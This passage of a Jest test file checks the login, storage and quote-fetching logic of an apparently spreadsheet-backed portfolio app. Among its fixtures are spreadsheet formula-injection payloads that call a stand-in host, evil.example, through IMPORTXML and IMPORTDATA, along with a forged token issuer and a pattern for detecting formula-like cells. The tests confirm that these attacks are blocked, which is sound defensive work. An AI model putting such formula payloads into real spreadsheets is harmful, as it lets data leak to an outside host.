      const admin = ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      expect(isErr({ action: 'loginGoogle', idToken: rt.idToken('g1', 'amy@example.com') })).toBe(
        true,
      );
      expect(rt.tokeninfoCalls).toHaveLength(0);
      ok({ action: 'adminSetConfig', session: admin.session, googleClientId: CLIENT_ID });
      expect(fail({ action: 'loginGoogle', idToken: 'forged' })).toBe('invalid_credentials');
      expect(fail({ action: 'loginGoogle' })).toBe('invalid_credentials');
    });

    it('creates a pending member, then signs them in once approved', () => {
      const admin = setup();
      const token = rt.idToken('g1', 'Amy@Example.com');
      const first = ok({ action: 'loginGoogle', idToken: token });
      expect(first.user).toMatchObject({
        username: 'amy@example.com',
        status: 'pending',
        googleLinked: true,
        hasPassword: false,
      });
      expect(first.session).toBeUndefined();
      ok({ action: 'adminUpdateUser', session: admin, userId: first.user.id, status: 'active' });
      const again = ok({ action: 'loginGoogle', idToken: token });
      expect(again.session).toBeTruthy();
      expect(again.user.id).toBe(first.user.id);
    });

    it('accepts both Google issuer spellings', () => {
      setup();
      expect(
        ok({
          action: 'loginGoogle',
          idToken: rt.idToken('g1', 'a@example.com', { iss: 'accounts.google.com' }),
        }).user.googleLinked,
      ).toBe(true);
      expect(
        ok({
          action: 'loginGoogle',
          idToken: rt.idToken('g2', 'b@example.com', { iss: 'https://accounts.google.com' }),
        }).user.googleLinked,
      ).toBe(true);
    });

    it('rejects tokens for another app, issuer, expiry, unverified email or missing subject', () => {
      setup();
      const bad: Array<Record<string, unknown>> = [
        { aud: 'someone-else.apps.example' },
        { iss: 'https://evil.example.com' },
        { exp: String(Math.floor(rt.clock.now / 1000) - 10) },
        { email_verified: 'false' },
        { email_verified: undefined },
        { sub: undefined },
        { sub: '' },
      ];
      bad.forEach((override, i) => {
        expect(
          fail({
            action: 'loginGoogle',
            idToken: rt.idToken(`bad${i}`, `bad${i}@example.com`, override),
          }),
        ).toBe('invalid_credentials');
      });
      expect(
        (
          ok({
            action: 'adminUsers',
            session: ok({ action: 'login', username: 'admin', passwordKey: key(1) }).session,
          }).users as Res[]
        ).length,
      ).toBe(1);
    });

    it('treats a token that expires later as expired once the clock passes it', () => {
      setup();
      const token = rt.idToken('g1', 'a@example.com');
      ok({ action: 'loginGoogle', idToken: token });
      rt.advance(2 * 3600_000);
      expect(fail({ action: 'loginGoogle', idToken: token })).toBe('invalid_credentials');
    });

    it('never attaches to an existing account just because the name matches', () => {
      const admin = setup();
      ok({ action: 'adminSetConfig', session: admin, registration: 'open' });
      const squatter = ok({ action: 'register', username: 'amy@example.com', passwordKey: key(5) });
      const google = ok({ action: 'loginGoogle', idToken: rt.idToken('g1', 'amy@example.com') });
      expect(google.user.id).not.toBe(squatter.user.id);
      expect(google.user.username).not.toBe('amy@example.com');
      expect(google.user.username).toMatch(/^amy@example\.com\+/);
    });

    it('links Google to a signed-in account, once per Google identity', () => {
      const admin = setup();
      const token = rt.idToken('g9', 'admin@example.com');
      const linked = ok({ action: 'linkGoogle', session: admin, idToken: token });
      expect(linked.user.googleLinked).toBe(true);
      const viaGoogle = ok({ action: 'loginGoogle', idToken: token });
      expect(viaGoogle.user.role).toBe('admin');

      ok({ action: 'adminSetConfig', session: admin, registration: 'open' });
      const amy = ok({ action: 'register', username: 'amy', passwordKey: key(2) });
      expect(isErr({ action: 'linkGoogle', session: amy.session, idToken: token })).toBe(true);
      expect(fail({ action: 'linkGoogle', idToken: token })).toBe('unauthenticated');
    });

    it('requires a valid token to link', () => {
      const admin = setup();
      expect(fail({ action: 'linkGoogle', session: admin, idToken: 'forged' })).toBe(
        'invalid_credentials',
      );
    });
  });

  describe('storage', () => {
    let session: string;
    beforeEach(() => {
      session = ok({ action: 'register', username: 'admin', passwordKey: key(1) }).session;
    });

    it('round-trips rows without losing types or leading zeros', () => {
      const instruments = [
        {
          id: 'tw_0050',
          symbol: '0050',
          leverage: 1,
          active: true,
          brokerIds: ['a', 'b'],
          note: 'x, "y"',
        },
        { id: 'n', symbol: '123', leverage: -2, active: false },
      ];
      const saved = ok({ action: 'save', session, tables: { instruments }, baseRevision: 0 });
      expect(saved).toEqual({ ok: true, revision: 1 });
      const loaded = ok({ action: 'load', session });
      expect(loaded.revision).toBe(1);
      expect(loaded.tables.instruments).toEqual(instruments);
      expect(loaded.tables.transactions).toEqual([]);
      // Mirror columns are text, so Sheets cannot reinterpret them.
      const user = JSON.parse(String(rt.sheets.get('_users')!.cells[1].at(-1)));
      expect(rt.spreadsheets.get(user.dataSheetId)!.sheets.get('instruments')!.cells[1][1]).toBe(
        '0050',
      );
    });

    it('never writes a cell that Sheets would run as a formula', () => {
      // A display name comes from anyone who can reach the sign-up form.
      rt.post({
        action: 'register',
        username: 'mallory',
        displayName: '=IMPORTXML("http://evil.example","//x")',
        passwordKey: key(9),
      });
      ok({
        action: 'save',
        session,
        tables: {
          brokers: [
            { id: 'a', name: '=1+1', note: '+cmd' },
            { id: 'b', name: '@x', note: '-2' },
            // A field *name* is written to the header row, so it counts too.
            { id: 'c', '=IMPORTDATA("http://evil.example")': 'x', ' =2': 'y', '\uFF1D3': 'z' },
          ],
        },
      });
      const formulaLike = [...rt.spreadsheets.values()]
        .flatMap((ss) => [...ss.sheets.values()])
        .flatMap((sheet) => sheet.cells.flat().map(String))
        .filter((cell) => /^[\s\u3000]*[=+\-@\uFF1D\uFF0B\uFF0D\uFF20]/.test(cell));
      expect(formulaLike).toEqual([]);
      // A field that borrows the JSON column's name cannot stand in for it.
      ok({
        action: 'save',
        session,
        tables: { accounts: [{ id: 'k', _json: '{"id":"forged"}' }] },
      });
      expect(ok({ action: 'load', session }).tables.accounts[0].id).toBe('k');
      // The stored rows themselves are unchanged.
      expect(ok({ action: 'load', session }).tables.brokers[0]).toEqual({
        id: 'a',
        name: '=1+1',
        note: '+cmd',
      });
    });

    it('rejects a stale revision and leaves data untouched', () => {
      ok({
        action: 'save',
        session,
        tables: { brokers: [{ id: 'a', name: 'A' }] },
        baseRevision: 0,
      });
      const stale = rt.post({ action: 'save', session, tables: { brokers: [] }, baseRevision: 0 });
      expect(stale).toEqual({ ok: false, error: 'conflict', revision: 1 });
      expect(ok({ action: 'load', session }).tables.brokers).toHaveLength(1);
    });

    it('reports a conflict for a member with no data yet without creating a spreadsheet', () => {
      const before = rt.spreadsheets.size;
      expect(
        rt.post({ action: 'save', session, tables: { brokers: [] }, baseRevision: 5 }),
      ).toEqual({ ok: false, error: 'conflict', revision: 0 });
      expect(rt.spreadsheets.size).toBe(before);
    });

    it('shrinks a table when rows are removed and ignores unknown tables', () => {
      ok({ action: 'save', session, tables: { brokers: [{ id: 'a' }, { id: 'b' }] } });
      ok({ action: 'save', session, tables: { brokers: [{ id: 'b' }], evil: [{ id: 1 }] } });
      expect(ok({ action: 'load', session }).tables.brokers).toEqual([{ id: 'b' }]);
      expect([...rt.spreadsheets.values()].some((ss) => ss.sheets.has('evil'))).toBe(false);
    });

    it('rejects rows without an id, and writes nothing from that request', () => {
      ok({ action: 'save', session, tables: { brokers: [{ id: 'a' }] } });
      const res = rt.post({
        action: 'save',
        session,
        tables: { accounts: [{ id: 'x' }], brokers: [{ name: 'no id' }] },
      });
      expect(res.ok).toBe(false);
      const loaded = ok({ action: 'load', session });
      expect(loaded.revision).toBe(1);
      expect(loaded.tables.accounts).toEqual([]);
    });

    it('fetches quotes, reports per-item errors and caches successes', () => {
      let calls = 0;
      rt = makeRuntime((reqs) => {
        calls += reqs.length;
        return reqs.map((r) =>
          r.url.includes('yahoo')
            ? {
                code: 200,
                text: JSON.stringify({
                  chart: {
                    result: [
                      {
                        meta: {
                          regularMarketPrice: 100.5,
                          currency: 'TWD',
                          regularMarketTime: 1_700_000_000,
                        },
                      },
                    ],
                  },
                }),
              }
            : r.url.includes('BTCUSDT')
              ? { code: 200, text: JSON.stringify({ price: '50000.10' }) }
              : { code: 451, text: '' },
        );
      });
      session = ok({ action: 'register', username: 'admin', passwordKey: key(1) }).session;
      const items = [
        { source: 'yahoo', symbol: '0050.TW' },
        { source: 'binance', symbol: 'BTCUSDT' },
        { source: 'binance', symbol: 'NOPE' },
        { source: 'manual', symbol: 'TX' },
      ];
      const { quotes } = ok({ action: 'quotes', session, items });
      expect(quotes[0]).toMatchObject({
        symbol: '0050.TW',
        price: 100.5,
        currency: 'TWD',
        status: 'delayed',
      });
      expect(quotes[1]).toMatchObject({ price: 50000.1, status: 'realtime' });
      expect(quotes[2].error).toBe('HTTP 451');
      expect(quotes[3].error).toMatch(/Manual/);
      expect(calls).toBe(3);
      ok({ action: 'quotes', session, items });
      expect(calls).toBe(4); // only the failed one is fetched again
    });

    it('fetches history behind a session', () => {
      rt = makeRuntime((reqs) =>
        reqs.map(() => ({
          code: 200,
          text: JSON.stringify([[Date.UTC(2026, 0, 2), '0', '0', '0', '123.5']]),
        })),
      );
      session = ok({ action: 'register', username: 'admin', passwordKey: key(1) }).session;
      const { history } = ok({
        action: 'history',
        session,
        items: [{ source: 'binance', symbol: 'BTCUSDT' }],
        from: '2026-01-01',
      });
      expect(history[0].points).toEqual([{ date: '2026-01-02', close: 123.5 }]);
      expect(isErr({ action: 'history', session, items: [], from: 'yesterday' })).toBe(true);
    });
  });

  describe('setup helper', () => {
    it('creates the control sheets and nothing for members', () => {
      rt.call('setupSheets');
      expect([...rt.sheets.keys()].sort()).toEqual(['_audit', '_config', '_sessions', '_users']);
      expect(rt.spreadsheets.size).toBe(1);
      // Running it again, or after accounts exist, changes nothing.
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      expect(ok({ action: 'config' }).config.hasUsers).toBe(true);
    });

    it('uses SHEET_ID when set', () => {
      rt.props.set('SHEET_ID', 'control');
      ok({ action: 'register', username: 'admin', passwordKey: key(1) });
      expect(rt.sheets.has('_users')).toBe(true);
    });
  });

  describe('Google-only deployment (the default)', () => {
    const OWNER = 'owner@example.com';
    beforeEach(() => {
      rt.props.delete('PASSWORD_LOGIN');
      rt.props.set('GOOGLE_CLIENT_ID', CLIENT_ID);
      rt.props.set('ADMIN_EMAILS', ` Someone@else.example , ${OWNER.toUpperCase()} `);
    });

    it('refuses password registration, login and password changes', () => {
      expect(fail({ action: 'register', username: 'admin', passwordKey: key(1) })).toBe(
        'password_disabled',
      );
      expect(fail({ action: 'login', username: 'admin', passwordKey: key(1) })).toBe(
        'password_disabled',
      );
      expect(rt.sheets.get('_users')?.cells.length ?? 0).toBe(0);
      const config = ok({ action: 'config' }).config;
      expect(config).toMatchObject({ passwordLogin: false, googleClientId: CLIENT_ID });
    });

    it('takes the client id from the script property over the saved one', () => {
      const owner = ok({ action: 'loginGoogle', idToken: rt.idToken('o', OWNER) });
      ok({
        action: 'adminSetConfig',
        session: owner.session,
        googleClientId: 'other-client.example',
      });
      expect(ok({ action: 'config' }).config.googleClientId).toBe(CLIENT_ID);
      expect(ok({ action: 'loginGoogle', idToken: rt.idToken('o', OWNER) }).session).toBeTruthy();
    });

    it('makes a listed address an admin, whoever signed in first', () => {
      const early = ok({ action: 'loginGoogle', idToken: rt.idToken('x', 'squatter@example.com') });
      expect(early.user).toMatchObject({ role: 'member', status: 'pending' });
      expect(early.session).toBeUndefined();
      const owner = ok({ action: 'loginGoogle', idToken: rt.idToken('o', OWNER) });
      expect(owner.user).toMatchObject({ role: 'admin', status: 'active' });
      expect(owner.session).toBeTruthy();
    });

    it('does not trust an unverified address, for admin or anything else', () => {
      expect(
        fail({
          action: 'loginGoogle',
          idToken: rt.idToken('o', OWNER, { email_verified: 'false' }),
        }),
      ).toBe('invalid_credentials');
      expect(rt.sheets.get('_users')?.cells.length ?? 0).toBe(0);
    });

    it('stops taking sign-ups when the approval queue or the member count is full', () => {
      rt.props.set('MAX_PENDING', '2');
      ok({ action: 'loginGoogle', idToken: rt.idToken('a', 'a@example.com') });
      ok({ action: 'loginGoogle', idToken: rt.idToken('b', 'b@example.com') });
      expect(fail({ action: 'loginGoogle', idToken: rt.idToken('c', 'c@example.com') })).toBe(
        'registration_full',
      );
      // Known members still sign in, and the admin address always gets in.
      expect(
        ok({ action: 'loginGoogle', idToken: rt.idToken('a', 'a@example.com') }).user.status,
      ).toBe('pending');
      expect(ok({ action: 'loginGoogle', idToken: rt.idToken('o', OWNER) }).user.role).toBe(
        'admin',
      );
      rt.props.set('MAX_PENDING', '50');
      rt.props.set('MAX_MEMBERS', '3');
      expect(fail({ action: 'loginGoogle', idToken: rt.idToken('d', 'd@example.com') })).toBe(
        'registration_full',
      );
    });

    it('gives nobody admin when no admin address is set', () => {
      rt.props.delete('ADMIN_EMAILS');
      const res = ok({ action: 'loginGoogle', idToken: rt.idToken('o', OWNER) });
      expect(res.user).toMatchObject({ role: 'member', status: 'pending' });
    });
  });
});
